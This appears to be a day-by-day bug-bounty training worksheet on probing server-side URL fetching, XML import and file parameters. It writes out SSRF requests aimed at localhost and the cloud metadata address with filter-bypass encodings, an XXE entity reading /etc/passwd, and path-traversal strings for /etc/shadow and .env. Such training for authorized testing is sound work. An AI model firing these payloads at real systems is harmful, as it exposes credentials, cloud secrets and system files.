---
title: "Live Programme Practice Day 5 — SSRF and Server-Side Attacks"
tags: [practice, live-programme, SSRF, XXE, path-traversal, server-side,
       cloud-metadata, bug-bounty, methodology]
module: 05-BugBountyOps-01
day: 280
related_topics:
  - Live Programme Practice Day 4 (Day 279)
  - SSRF Fundamentals (Day 113)
  - Blind SSRF and OOB Techniques (Day 115)
  - SSRF Filter Bypass Techniques (Day 116)
---

# Day 280 — Live Programme Practice Day 5: SSRF and Server-Side Attacks

> "SSRF is the most underestimated vulnerability in cloud-hosted applications.
> Every application that accepts a URL has an SSRF surface. Find every place
> the server makes an outbound request on your behalf — image loading, PDF
> generation, webhook delivery, URL import, link preview. Test each one."
>
> — Ghost

---

## Goals

Systematically probe every server-side URL-fetching feature for SSRF.
Test path traversal on any file-related feature.

**Time budget:** 5–6 hours.

---

## Block 1 — SSRF Surface Mapping (60 min)

Enumerate every feature that might trigger a server-side HTTP request:

```
Feature                         Endpoint              URL parameter
───────────���────────────────────────────────���─────────────────────
Image/avatar URL upload          ___                  ___
PDF/export generation           ___                  ___
Webhook configuration           ___                  ___
Link preview / OG scraper       ___                  ___
Import from URL (CSV, feed)     ___                  ___
URL redirect / shortener        ___                  ___
API proxying feature            ___                  ___
```

---

## Block 2 — SSRF Testing (120 min)

For each identified URL-fetching feature:

```bash
# Set up Burp Collaborator (or interact.sh) for OOB detection:
# interactsh-client -v  (ProjectDiscovery)

# Test 1: Does the server fetch the URL?
curl -X POST https://target.example.com/api/webhook \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://YOUR_COLLABORATOR_URL/"}'

# Test 2: Internal service access
curl -X POST ... -d '{"url": "http://127.0.0.1/"}'
curl -X POST ... -d '{"url": "http://localhost:8080/"}'
curl -X POST ... -d '{"url": "http://169.254.169.254/"}'  # AWS metadata

# Test 3: Filter bypass (if basic payloads blocked)
# URL encoding:       http://0x7f000001/  (127.0.0.1 hex)
# IPv6:               http://[::1]/
# DNS rebinding:      use a DNS rebinding service
# Decimal IP:         http://2130706433/  (127.0.0.1 decimal)
# Redirect chain:     host your own redirect to 169.254.169.254
```

SSRF test results:
```
Feature: ___  Payload: ___  Result: ___  OOB callback: Y/N
Feature: ___  Payload: ___  Result: ___  OOB callback: Y/N
```

---

## Block 3 — XXE Testing (60 min)

Any endpoint accepting XML input:

```bash
# Test basic XXE:
POST /api/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Test via content-type switching:
# Change Content-Type to application/xml on a JSON endpoint
# Result: ___

# Test SVG upload (if file upload exists):
# SVG with embedded XXE entity
```

---

## Block 4 — Path Traversal (60 min)

Any endpoint with a filename or path parameter:

```
?file=../../etc/passwd
?path=../../../etc/shadow
?template=../../../../etc/passwd
?resource=/etc/passwd
?download=../../.env

# URL-encoded variants:
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=....//....//etc/passwd
```

Test results:
```
Endpoint: ___  Payload: ___  Result: ___
```

---

## Session Debrief

```
SSRF surface endpoints tested: ___
Successful SSRF: Y/N  Details: ___
XXE vectors tested: ___
Path traversal results: ___
OOB callbacks received: ___
Best finding: ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q280.1, Q280.2 …).

---

## Navigation

← Previous: [Day 279 — Live Programme Practice Day 4](DAY-0279-Live-Programme-Practice-Day-04.md)
→ Next: [Day 281 — Live Programme Practice Day 6](DAY-0281-Live-Programme-Practice-Day-06.md)
